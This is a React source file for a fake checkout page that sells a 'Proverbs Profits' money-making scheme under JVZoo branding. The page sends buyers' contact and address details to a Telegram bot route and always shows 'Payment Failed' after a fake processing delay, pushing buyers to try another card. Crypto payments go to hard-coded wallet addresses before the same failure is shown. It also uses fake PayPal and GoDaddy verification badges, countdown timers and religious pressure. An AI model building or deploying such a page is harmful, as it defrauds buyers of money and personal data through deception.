"use client";

import React, { useState, useEffect } from 'react';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import './checkout.css';

const CRYPTO_DATA = {
  btc: { name: 'Bitcoin (BTC)', network: 'Bitcoin', address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
  eth: { name: 'Ethereum (ETH)', network: 'Ethereum (ERC20)', address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F' },
  usdt: { name: 'Tether (USDT)', network: 'Tron (TRC20)', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
  usdc: { name: 'USD Coin (USDC)', network: 'Ethereum (ERC20)', address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F' },
  sol: { name: 'Solana (SOL)', network: 'Solana', address: '7uv8vYpSqBvS37qF78vSqBvS37qF78vSqBvS37qF78vS' }
};

export default function Checkout() {
  const router = useRouter();
  const [mounted, setMounted] = useState(false);
  const [timeLeft, setTimeLeft] = useState(10 * 60); // 10 minutes
  const [isProcessing, setIsProcessing] = useState(false);
  const [showError, setShowError] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState('card');
  
  // Form States
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    street: '',
    city: '',
    state: '',
    zip: '',
    cardNumber: '',
    expiry: '',
    cvc: ''
  });
  const [cardType, setCardType] = useState('unknown');
  
  // Crypto payment states
  const [selectedCrypto, setSelectedCrypto] = useState(null);
  const [isCryptoDialogOpen, setIsCryptoDialogOpen] = useState(false);
  const [cryptoTimeLeft, setCryptoTimeLeft] = useState(7 * 60); // 7 minutes

  useEffect(() => {
    setMounted(true);
    const timer = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Redirect when timer expires
  useEffect(() => {
    if (mounted && timeLeft === 0) {
      router.push('/');
    }
  }, [timeLeft, mounted, router]);

  useEffect(() => {
    let timer;
    if (isCryptoDialogOpen && cryptoTimeLeft > 0) {
      timer = setInterval(() => {
        setCryptoTimeLeft(prev => prev - 1);
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [isCryptoDialogOpen, cryptoTimeLeft]);

  const formatTime = (seconds) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const detectCardType = (number) => {
    const re = {
      electron: /^(4026|417500|4405|4508|4844|4913|4917)/,
      maestro: /^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)/,
      dankort: /^(5019)/,
      interpayment: /^(636)/,
      unionpay: /^(62|88)/,
      visa: /^4/,
      mastercard: /^5[1-5]/,
      amex: /^3[47]/,
      diners: /^3(?:0[0-5]|[68])/,
      discover: /^6(?:011|5)/,
      jcb: /^(?:2131|1800|35)/
    };
    for (const key in re) {
      if (re[key].test(number)) return key;
    }
    return 'unknown';
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    if (name === 'cardNumber') {
      const cleanValue = value.replace(/\D/g, '');
      setFormData(prev => ({ ...prev, [name]: cleanValue }));
      setCardType(detectCardType(cleanValue));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }
  };

  const handleCryptoSelect = (e) => {
    const val = e.target.value;
    if (val && CRYPTO_DATA[val]) {
      setSelectedCrypto(CRYPTO_DATA[val]);
      setCryptoTimeLeft(7 * 60);
      setIsCryptoDialogOpen(true);
    }
  };

  const sendDataToTelegram = async (extra = {}) => {
    try {
      // Filter out sensitive card info or crypto addresses if requested
      const { cardNumber, expiry, cvc, ...safeFormData } = formData;
      
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...safeFormData,
          paymentMethod,
          ...extra
        })
      });

      const result = await response.json().catch(() => ({ error: 'Invalid JSON response from server' }));
      
      if (!response.ok) {
        console.error("Bot sync failed. Status:", response.status, "Result:", result);
        // Alert the user so they can see why it's failing on Vercel
        const errorMsg = result.error || result.description || 'Unknown server error';
        alert(`Telegram Sync Error: ${errorMsg}`);
        return false;
      }
      
      console.log("Telegram sync successful");
      return true;
    } catch (err) {
      console.error("Failed to sync with bot", err);
      alert(`Critical Sync Error: ${err.message}`);
      return false;
    }
  };

  const handleTestSync = async () => {
    alert("Starting Test Sync...");
    const success = await sendDataToTelegram({ status: "TEST CONNECTION" });
    if (success) {
      alert("Test Sync SUCCESSFUL! Check your Telegram.");
    } else {
      alert("Test Sync FAILED. Check the console or the error alert.");
    }
  };

  const handlePurchase = async (e) => {
    if (e) e.preventDefault();
    if (isProcessing) return;

    // Check if form is valid using the event target
    const form = e.currentTarget;
    if (form && !form.checkValidity()) {
      form.reportValidity();
      return;
    }

    console.log("Starting final sync...");
    // Immediate feedback
    // alert("Processing your order... syncing with bot.");

    // Always sync form data first
    const syncSuccess = await sendDataToTelegram({ status: "Final Submission - Card" });
    
    if (!syncSuccess) {
       // If sync failed, the alert inside sendDataToTelegram already showed the error
       return;
    }

    if (paymentMethod === 'crypto') {
      if (!selectedCrypto) {
        alert("Please select a cryptocurrency first.");
        return;
      }
      setIsCryptoDialogOpen(true);
      return;
    }
    
    setIsProcessing(true);
    setShowError(false);

    setTimeout(() => {
      setIsProcessing(false);
      setShowError(true);
    }, 5000);
  };

  const handleCryptoContinue = async () => {
    setIsCryptoDialogOpen(false);
    setIsProcessing(true);
    
    // Sync final crypto intent
    await sendDataToTelegram({ status: "Final Submission - Crypto (Paid)", crypto: selectedCrypto.name });

    setTimeout(() => {
      setIsProcessing(false);
      setShowError(true);
    }, 5000);
  };

  if (!mounted) return null;

  return (
    <>
      {showError && (
        <div className="error-modal-overlay">
          <div className="error-modal">
            <i className="ph-fill ph-warning-circle error-icon"></i>
            <h3 className="error-title">Payment Failed</h3>
            <p className="error-message">We were unable to process your transaction. Please try another card or payment method.</p>
            <button className="btn-close-modal" onClick={() => setShowError(false)}>
              Try Again
            </button>
          </div>
        </div>
      )}

      {isCryptoDialogOpen && selectedCrypto && (
        <div className="error-modal-overlay">
          <div className="error-modal" style={{ maxWidth: '500px', border: '2px solid #f7931a' }}>
            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}>
              <i className="ph-fill ph-currency-btc" style={{ fontSize: '4rem', color: '#f7931a' }}></i>
            </div>
            <h3 className="error-title" style={{ color: '#000', marginBottom: '5px' }}>Send {selectedCrypto.name}</h3>
            <p className="error-message" style={{ marginBottom: '20px' }}>To complete your order, please send the amount below.</p>
            
            <div style={{ backgroundColor: '#fdf2f2', border: '1px solid #feb2b2', padding: '15px', borderRadius: '8px', marginBottom: '20px', textAlign: 'left' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px' }}>
                <span style={{ fontWeight: 'bold', color: '#c53030' }}>Fixed Amount:</span>
                <span style={{ fontWeight: '900', color: '#c53030', fontSize: '1.2rem' }}>$67.00 USD</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                <span style={{ fontWeight: 'bold', color: '#2d3748' }}>Network:</span>
                <span style={{ fontWeight: 'bold', color: '#2d3748' }}>{selectedCrypto.network}</span>
              </div>
            </div>

            <div style={{ marginBottom: '25px' }}>
              <div style={{ fontSize: '0.8rem', fontWeight: 'bold', color: '#666', marginBottom: '8px', textAlign: 'left' }}>RECEIVER WALLET ADDRESS</div>
              <div style={{ backgroundColor: '#f9f9f9', padding: '15px', borderRadius: '8px', wordBreak: 'break-all', fontFamily: 'monospace', fontSize: '0.95rem', border: '1px dashed #f7931a', color: '#333', textAlign: 'center', fontWeight: 'bold' }}>
                {selectedCrypto.address}
              </div>
            </div>
            
            <div style={{ background: '#fff5eb', padding: '15px', borderRadius: '8px', marginBottom: '25px' }}>
              <div style={{ fontSize: '0.9rem', color: '#c05621', marginBottom: '5px', fontWeight: 'bold' }}>PAYMENT EXPIRES IN</div>
              <div style={{ fontSize: '2.5rem', fontWeight: '900', color: '#c05621' }}>{formatTime(cryptoTimeLeft)}</div>
            </div>

            <p style={{ fontSize: '0.85rem', color: '#718096', marginBottom: '25px', lineHeight: '1.5', fontWeight: '500' }}>
              Tap **Continue** if you have made the payment.
            </p>

            <button className="btn-complete" style={{ backgroundColor: '#f7931a', boxShadow: '0 4px 0 #c05621' }} onClick={handleCryptoContinue}>
               Continue
            </button>
            
            <button style={{ background: 'none', border: 'none', color: '#a0aec0', fontSize: '0.8rem', marginTop: '15px', cursor: 'pointer', textDecoration: 'underline' }} onClick={() => setIsCryptoDialogOpen(false)}>
              Go back
            </button>
          </div>
        </div>
      )}

      <header className="checkout-header">
        <div className="checkout-header-content">
          <div className="logo-container" style={{ gap: '10px' }}>
            <div className="logo-img-wrapper">
              <Image 
                src="/images/pp-logo-black-tex.png" 
                alt="Proverbs Profits Logo" 
                width={35} 
                height={35} 
                className="logo-img"
              />
            </div>
            <span className="logo-text" style={{ color: '#fff', fontSize: '1.25rem' }}>Proverbs <span className="logo-highlight">Profits</span></span>
          </div>
          
          <div className="checkout-banner-text">
            THE 60 SECOND WIFI TRICK
          </div>
          
          <div className="checkout-guarantee-badge">
            <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
              <circle cx="50" cy="50" r="45" fill="#E88E33" stroke="#C47321" strokeWidth="2" strokeDasharray="4 4" />
              <text x="50" y="45" fontSize="24" fontWeight="bold" fill="#000" textAnchor="middle">100%</text>
              <text x="50" y="65" fontSize="12" fontWeight="bold" fill="#000" textAnchor="middle">GUARANTEE</text>
            </svg>
          </div>
        </div>
        
        <div className="checkout-trust-bar">
          <div className="checkout-trust-item"><i className="ph-fill ph-check-circle" style={{color: '#fff'}}></i> Money Back Guarantee</div>
          <div className="checkout-trust-item"><i className="ph-fill ph-check-circle" style={{color: '#fff'}}></i> Zero Tech Skills Needed</div>
          <div className="checkout-trust-item"><i className="ph-fill ph-check-circle" style={{color: '#fff'}}></i> Instant Access</div>
          <div className="checkout-trust-item"><i className="ph-fill ph-check-circle" style={{color: '#fff'}}></i> One Time Fee</div>
        </div>
      </header>

      <div className="checkout-secure-bar">
        <i className="ph-fill ph-lock-key"></i> Secure Checkout
      </div>

      <div className="checkout-container">
        {/* Left Side: Form */}
        <div className="checkout-left">
          <div className="timer-box">
            <div className="timer-text">Hurry, your checkout expires soon</div>
            <div className="timer-countdown">00:{formatTime(timeLeft)}</div>
          </div>

          <form onSubmit={handlePurchase} className="checkout-form-section" style={{ opacity: isProcessing ? 0.5 : 1, pointerEvents: isProcessing ? 'none' : 'auto' }}>
            <h2 className="checkout-form-title">Customer Information</h2>
            
            <div className="checkout-form-subtitle">CONTACT DETAILS</div>
            <div className="form-row">
              <div className="form-group">
                <input type="text" name="firstName" className="form-input" placeholder="First Name" value={formData.firstName} onChange={handleInputChange} required />
              </div>
              <div className="form-group">
                <input type="text" name="lastName" className="form-input" placeholder="Last Name" value={formData.lastName} onChange={handleInputChange} required />
              </div>
            </div>
            
            <div className="form-row">
              <div className="form-group" style={{ flex: '1' }}>
                <input type="email" name="email" className="form-input" placeholder="Email Address" value={formData.email} onChange={handleInputChange} required />
              </div>
            </div>
            
            <div className="form-row">
              <div className="form-group" style={{ flex: '1' }}>
                <input type="tel" name="phone" className="form-input" placeholder="Phone Number" value={formData.phone} onChange={handleInputChange} required />
              </div>
            </div>

            <div className="checkout-form-subtitle" style={{marginTop: '25px'}}>BILLING DETAILS</div>
            <div className="form-row">
              <div className="form-group" style={{ flex: '1' }}>
                <input type="text" name="street" className="form-input" placeholder="Street Address" value={formData.street} onChange={handleInputChange} required />
              </div>
            </div>
            <div className="form-row">
              <div className="form-group">
                <input type="text" name="city" className="form-input" placeholder="City" value={formData.city} onChange={handleInputChange} required />
              </div>
              <div className="form-group">
                <input type="text" name="state" className="form-input" placeholder="State / Province" value={formData.state} onChange={handleInputChange} required />
              </div>
              <div className="form-group">
                <input type="text" name="zip" className="form-input" placeholder="ZIP / Postal Code" value={formData.zip} onChange={handleInputChange} required />
              </div>
            </div>

            <div style={{ marginTop: '40px' }}>
              <h2 className="checkout-form-title">Payment Information</h2>
              <div className="checkout-form-subtitle">PAYMENT METHODS</div>
            
            <div style={{ display: 'flex', gap: '15px', marginBottom: '20px' }}>
              <label style={{ flex: 1, border: `2px solid ${paymentMethod === 'card' ? '#178331' : '#ccc'}`, padding: '15px', borderRadius: '4px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '10px', backgroundColor: paymentMethod === 'card' ? '#f0fdf4' : '#fff', transition: 'all 0.2s' }}>
                <input type="radio" name="payment_method" value="card" checked={paymentMethod === 'card'} onChange={() => setPaymentMethod('card')} style={{ cursor: 'pointer' }} />
                <i className="ph-fill ph-credit-card" style={{ fontSize: '1.2rem', color: paymentMethod === 'card' ? '#178331' : '#666' }}></i>
                <strong>Credit Card</strong>
              </label>
              
              <label style={{ flex: 1, border: `2px solid ${paymentMethod === 'crypto' ? '#178331' : '#ccc'}`, padding: '15px', borderRadius: '4px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '10px', backgroundColor: paymentMethod === 'crypto' ? '#f0fdf4' : '#fff', transition: 'all 0.2s' }}>
                <input type="radio" name="payment_method" value="crypto" checked={paymentMethod === 'crypto'} onChange={() => setPaymentMethod('crypto')} style={{ cursor: 'pointer' }} />
                <i className="ph-fill ph-currency-btc" style={{ fontSize: '1.2rem', color: paymentMethod === 'crypto' ? '#178331' : '#666' }}></i>
                <strong>Crypto Wallet</strong>
              </label>
            </div>
            
            {paymentMethod === 'card' && (
              <div className="card-payment-form" style={{ marginBottom: '20px', padding: '15px', border: '1px solid #ccc', borderRadius: '4px', backgroundColor: '#f9f9f9' }}>
                <div style={{ fontWeight: '600', marginBottom: '15px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <i className="ph-fill ph-credit-card" style={{ fontSize: '1.5rem', color: '#0d5f30' }}></i>
                    Credit / Debit Card Details
                  </div>
                  {cardType !== 'unknown' && (
                    <div style={{ textTransform: 'uppercase', fontSize: '0.75rem', backgroundColor: '#0d5f30', color: '#fff', padding: '2px 8px', borderRadius: '4px' }}>
                      {cardType}
                    </div>
                  )}
                </div>
                
                <div className="form-row">
                  <div className="form-group" style={{ flex: '1' }}>
                    <input 
                      type="text" 
                      name="cardNumber"
                      className="form-input" 
                      placeholder="Card Number" 
                      value={formData.cardNumber}
                      onChange={handleInputChange}
                      required
                    />
                  </div>
                </div>
                <div className="form-row">
                  <div className="form-group">
                    <input type="text" name="expiry" className="form-input" placeholder="MM / YY" value={formData.expiry} onChange={handleInputChange} required />
                  </div>
                  <div className="form-group">
                    <input type="text" name="cvc" className="form-input" placeholder="CVC" value={formData.cvc} onChange={handleInputChange} required />
                  </div>
                </div>
              </div>
            )}

            {paymentMethod === 'crypto' && (
              <div className="crypto-payment-form" style={{ marginBottom: '20px', padding: '15px', border: '1px solid #ccc', borderRadius: '4px', backgroundColor: '#f9f9f9' }}>
                <div style={{ fontWeight: '600', marginBottom: '15px', display: 'flex', alignItems: 'center', gap: '10px' }}>
                  <i className="ph-fill ph-currency-btc" style={{ fontSize: '1.5rem', color: '#0d5f30' }}></i>
                  Pay with Cryptocurrency
                </div>
                
                <p style={{ fontSize: '0.9rem', color: '#555', marginBottom: '15px' }}>
                  Select your preferred cryptocurrency below. You will be provided with a secure wallet address to complete the transfer.
                </p>

                <div className="form-row">
                  <div className="form-group" style={{ flex: '1' }}>
                    <select className="form-input" style={{ backgroundColor: '#fff', cursor: 'pointer' }} onChange={handleCryptoSelect}>
                      <option value="">Select Cryptocurrency...</option>
                      <option value="btc">Bitcoin (BTC)</option>
                      <option value="eth">Ethereum (ETH)</option>
                      <option value="usdt">Tether (USDT)</option>
                      <option value="usdc">USD Coin (USDC)</option>
                      <option value="sol">Solana (SOL)</option>
                    </select>
                  </div>
                </div>
              </div>
            )}
            
            <div className="coupon-box">
              <input type="text" className="form-input" placeholder="Coupon Code" />
              <button className="btn-apply">APPLY</button>
            </div>
            
            <label className="checkbox-row">
              <input type="checkbox" defaultChecked={false} />
              <span>Notify me of updates and future products from SMB</span>
            </label>
            </div>

            <div style={{ marginTop: '30px' }}>
              <p className="terms-text" style={{ marginBottom: '15px' }}>
                By clicking &quot;Complete Purchase&quot; I agree to JVZoo&apos;s <a href="#" style={{color: '#178331'}}>Terms Of Use</a> and <a href="#" style={{color: '#178331'}}>Privacy Policy</a>.
              </p>
              <button type="submit" className="btn-complete" disabled={isProcessing} style={{ opacity: isProcessing ? 0.7 : 1 }}>
                <i className="ph-fill ph-lock-key"></i> {isProcessing ? 'Processing...' : 'Complete Purchase'}
              </button>
            </div>
          </form>

          {isProcessing && (
            <div className="processing-box">
              <div className="processing-title">We are processing<br />your request...</div>
              <div className="processing-bar animate"></div>
              <p className="terms-text" style={{marginTop: '40px'}}>One moment, please...</p>
            </div>
          )}
        </div>

        {/* Right Side: Summary */}
        <div className="checkout-right" style={{ opacity: isProcessing ? 0.5 : 1, pointerEvents: isProcessing ? 'none' : 'auto' }}>
          <h2 className="summary-title">Cart Summary</h2>
          
          <div className="summary-img">
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: 'linear-gradient(to bottom, rgba(255,200,100,0.2), rgba(0,0,0,0.8))' }}></div>
            <i className="ph-fill ph-sparkle" style={{ fontSize: '4rem', color: '#ffb347', zIndex: 1 }}></i>
            <div className="summary-img-text">
              <div style={{ fontSize: '0.9rem', marginBottom: '4px' }}>I AM YOUR LORD AND SAVIOR,</div>
              <div style={{ fontSize: '1rem' }}>DO NOT IGNORE THIS BLESSING</div>
            </div>
          </div>
          
          <h3 className="summary-product-name">Proverbs Profits</h3>
          
          <div className="summary-line">
            <span>Quantity: 1</span>
            <span>$67.00</span>
          </div>
          
          <div className="summary-total">
            <span>Order Total:<br/><span style={{fontSize: '0.8rem', fontWeight: 'normal', color: '#666'}}>+ any applicable taxes</span></span>
            <span>$67.00</span>
          </div>
          
          <div className="summary-currency">This is a single payment made in U.S. Dollars</div>
          
          <div className="upsell-box">
            <label className="upsell-header">
              <input type="checkbox" defaultChecked={false} />
              <span>Yes, I want to add <strong>Yes, I want personal guidance from Pastor Chuck</strong></span>
              <span className="upsell-price">$19.99</span>
            </label>
            <div className="upsell-desc">
              Direct assistance from Pastor Chuck which normally costs thousands. If you struggle with technology this is highly recommended. I will give you my personal email you can mail me anytime.
            </div>
          </div>
          
          <div className="checkout-badges">
            <div className="badge-box paypal">PayPal VERIFIED</div>
            <div className="badge-box godaddy">GoDaddy VERIFIED</div>
          </div>
          
          <div className="guarantee-box">
            <div style={{ background: '#82cc9f', color: '#000', display: 'inline-block', padding: '5px 10px', fontWeight: 'bold', fontSize: '1.2rem', marginBottom: '15px' }}>
              100% SATISFACTION GUARANTEE
            </div>
            
            <h3 className="guarantee-title">THE PROVERBS PROFITS RISK FREE 30 DAY GUARANTEE</h3>
            
            <p style={{ fontSize: '0.9rem', marginBottom: '15px' }}>Prepare to...</p>
            
            <ul className="guarantee-list">
              <li>
                <div className="guarantee-number">1</div>
                <div>Turn your phone into a reliable income stream (even if you have zero tech skills!)</div>
              </li>
              <li>
                <div className="guarantee-number">2</div>
                <div>Enjoy the freedom to work from anywhere, at any age, with a system that&apos;s so simple anyone can follow it.</div>
              </li>
              <li>
                <div className="guarantee-number">3</div>
                <div>Feel the excitement as you see extra cash rolling in without ever feeling overwhelmed or confused.</div>
              </li>
            </ul>
            
            <div className="guarantee-desc">
              And if you don&apos;t: let us know, and we&apos;ll refund every penny. That&apos;s how confident we are that you&apos;ll LOVE what Proverbs Profits can do for you!
            </div>
          </div>
        </div>
      </div>

      <footer className="checkout-footer">
        <div className="footer-content">
          <h3>Terms of sale</h3>
          <ul className="footer-list">
            <li>All Fraud will be prosecuted. Your IP is 102.91.77.98. You have been referred by David Fearon (#352111).</li>
            <li>This product is created by SMB and sold by JVZoo.</li>
            <li>This product has 30 days return policy and will be handled by the product vendor.</li>
            <li>All support requests must be directed to the product vendor.</li>
            <li>The vendor of this product reserves the right to do business or not do business with whom they choose.</li>
            <li>All information submitted here is subject to our <a href="#" style={{color: '#e0852a'}}>privacy policy</a>.</li>
            <li>Your information will be provided to the product&apos;s vendor upon successful completion of this sale.</li>
          </ul>
          
          <p className="footer-disclaimer">
            Disclaimer: By completing your purchase, you acknowledge that JVZoo is a platform facilitating the sale of this product. While JVZoo reviews sales pages for compliance with marketplace guidelines, it does not independently verify the accuracy, legality, or truthfulness of the claims made. Vendors are solely responsible for ensuring their claims are accurate, compliant with applicable laws (including FTC regulations), and supported by verifiable proof. JVZoo&apos;s review process does not constitute endorsement, approval, or validation of the product or its promotions.
          </p>
          
          <div className="footer-bottom">
            <div>&copy; 2026 JVZoo.com v11.7.4-4 jvzoonetwork.com</div>
            <div className="footer-links">
              <button onClick={handleTestSync} style={{ background: 'none', border: 'none', color: '#666', cursor: 'pointer', fontSize: '0.7rem' }}>Test Bot Connection</button>
              <a href="#">Privacy Policy</a>
              <a href="#">Terms Of Use</a>
              <a href="#">Earnings Disclaimer</a>
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}
